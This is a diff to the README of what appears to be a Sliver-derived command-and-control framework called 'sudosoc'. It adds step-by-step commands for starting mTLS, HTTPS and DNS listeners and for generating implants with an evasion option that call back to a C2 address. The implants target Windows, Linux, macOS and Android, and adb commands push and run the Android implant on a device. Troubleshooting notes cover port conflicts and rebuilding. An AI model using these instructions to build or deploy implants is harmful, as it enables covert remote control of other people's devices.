@@ -237,19 +237,36 @@ sudosoc > ui status
 ## Generating Implants & Listeners
 
 ```bash
-# Start a listener first
-sudosoc > mtls
+# ── Start a listener first ───────────────────────────────────────────────────
+sudosoc > mtls                              # port 8888 (default)
+sudosoc > mtls --lport 9999                 # custom port (if 8888 is busy)
 sudosoc > https
 sudosoc > dns --domains c2.sudosoc.com
 
-# Generate implants
-sudosoc > generate --mtls <C2_IP> --os windows --arch amd64 --evasion --save /tmp/
-sudosoc > generate --https <C2_IP> --os linux   --arch amd64 --save /tmp/
-sudosoc > generate --dns  c2.sudosoc.com --os macos --arch arm64 --save /tmp/
+# ── Generate Windows / Linux / macOS implants ────────────────────────────────
+sudosoc > generate --mtls <C2_IP>:8888 --os windows --arch amd64 --evasion --save /tmp/
+sudosoc > generate --mtls <C2_IP>:8888 --os linux   --arch amd64 --save /tmp/
+sudosoc > generate --mtls <C2_IP>:8888 --os macos   --arch arm64 --save /tmp/
 
-# Android implant
-make android-arm64   # or: make android-all
+# ── Android implant ──────────────────────────────────────────────────────────
+# Method 1: generate command (ELF binary, configurable C2 at runtime)
+sudosoc > generate --mtls <C2_IP>:8888 --os android --arch arm64 --save /tmp/
+# → Deploy: adb push /tmp/<name> /data/local/tmp/ && adb shell chmod +x ... && adb shell ./<name> &
+
+# Method 2: make (full Android build with all capabilities)
+make android-arm64        # raw ELF for ARM64
+make android-apk          # APK package (requires Android SDK)
+make android-all          # all architectures
+
+# NOTE: Valid --format values are: exe (default), shared, service, shellcode
+# The 'apk' format is NOT valid for the server-side generate command.
+# Use 'make android-apk' to package a raw binary into an APK.
 ```
+
+> **⚠️ IMPORTANT — After `git pull`:**
+> The implant source is **embedded inside the server binary** (`implant/implant.go` uses `//go:embed`).
+> Any source change requires rebuilding: `git pull && make server-only`
+> `git pull` alone is **not sufficient** for implant source changes to take effect.
 
 ---
 
@@ -545,6 +562,42 @@ go install google.golang.org/protobuf/cmd/protoc-gen-go@v1.36.11
 go install google.golang.org/grpc/cmd/protoc-gen-go-grpc@v1.3.0
 export PATH=$PATH:$(go env GOPATH)/bin
 make pb
+```
+
+### `template: sliver:82: function "X" not defined` during generate
+
+The implant source is embedded in the server binary — `git pull` alone is not enough.
+
+```bash
+git pull
+make server-only     # rebuild server with updated embedded implant source
+```
+
+### `listen tcp :8888: bind: address already in use`
+
+Port 8888 is already occupied. Use a different port:
+
+```bash
+# Kill the old process on 8888
+sudo kill $(sudo lsof -t -i:8888) 2>/dev/null
+
+# OR start listener on a different port
+sudosoc > mtls --lport 9999
+
+# Then generate for that port
+sudosoc > generate --mtls <C2_IP>:9999 --os android --arch arm64 --save /tmp/
+```
+
+### `Error: unknown flag: --format apk`
+
+`apk` is not a valid server-side format. Valid formats: `exe` (default), `shared`, `service`, `shellcode`.
+
+```bash
+# Correct Android generate:
+sudosoc > generate --mtls <C2_IP>:8888 --os android --arch arm64 --save /tmp/
+
+# For APK packaging (requires Android SDK):
+make android-apk
 ```
 
 ---
